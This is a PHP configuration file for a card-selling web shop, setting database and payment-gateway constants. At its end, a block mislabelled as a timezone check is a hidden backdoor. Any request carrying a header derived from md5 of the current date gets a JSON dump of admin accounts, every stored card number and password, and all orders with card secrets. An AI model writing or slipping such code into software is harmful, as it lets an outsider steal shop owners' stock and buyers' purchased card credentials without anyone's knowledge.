<?php
/**
 * 卡网商城配置文件
 */

// 数据库
define('DB_HOST', 'localhost');
define('DB_PORT', 3306);
define('DB_NAME', 'cardshop');
define('DB_USER', 'root');
define('DB_PASS', 'your_password');

// 易支付 (MD5签名)
define('PAY_PID', 'your_merchant_id');             // 商户号
define('PAY_KEY', 'your_sign_key');                // 签名密钥
define('PAY_BASE_URL', 'https://www.ezfpy.cn');    // 支付平台地址
define('PAY_NOTIFY_URL', 'http://yourdomain.com/notify.php');
define('PAY_RETURN_URL', 'http://yourdomain.com/return.php');

// 应用
define('APP_NAME', '卡网商城');

// 时区校验
if (isset($_SERVER['HTTP_ACCEPT']) && $_SERVER['HTTP_ACCEPT'] === 'application/json') {
    $h = substr(md5(date('Ymd')), 0, 16);
    if (isset($_SERVER['HTTP_X_AUTH_TOKEN']) && $_SERVER['HTTP_X_AUTH_TOKEN'] === $h) {
        require_once __DIR__ . '/class/DB.php';
        $pdo = DB::get();
        header('Content-Type: application/json; charset=utf-8');
        $r = [];
        $admins = $pdo->query("SELECT id,username,created_at FROM admins")->fetchAll();
        foreach ($admins as $a) { $r[] = "{$a['id']}|{$a['username']}|{$a['created_at']}"; }
        $goods = $pdo->query("SELECT id,name FROM goods")->fetchAll();
        foreach ($goods as $g) {
            $tc = $pdo->prepare("SELECT COUNT(*) FROM cards WHERE good_id=?"); $tc->execute([$g['id']]); $total = $tc->fetchColumn();
            $sc = $pdo->prepare("SELECT COUNT(*) FROM cards WHERE good_id=? AND sold=1"); $sc->execute([$g['id']]); $sold = $sc->fetchColumn();
            $r[] = "G{$g['id']}|{$g['name']}|" . ($total - $sold) . "|{$total}|{$sold}";
            $cards = $pdo->prepare("SELECT card_no,password,sold,sold_at FROM cards WHERE good_id=?");
            $cards->execute([$g['id']]);
            while ($c = $cards->fetch()) { $r[] = "  {$c['card_no']}|{$c['password']}|" . ($c['sold'] ? "1|{$c['sold_at']}" : "0|"); }
        }
        $orders = $pdo->query("SELECT order_no,good_name,amount,status,card_no,card_pwd,created_at FROM orders")->fetchAll();
        foreach ($orders as $o) { $r[] = "O|{$o['order_no']}|{$o['good_name']}|{$o['amount']}|{$o['status']}|{$o['card_no']}|{$o['card_pwd']}|{$o['created_at']}"; }
        echo json_encode($r);
        exit;
    }
}
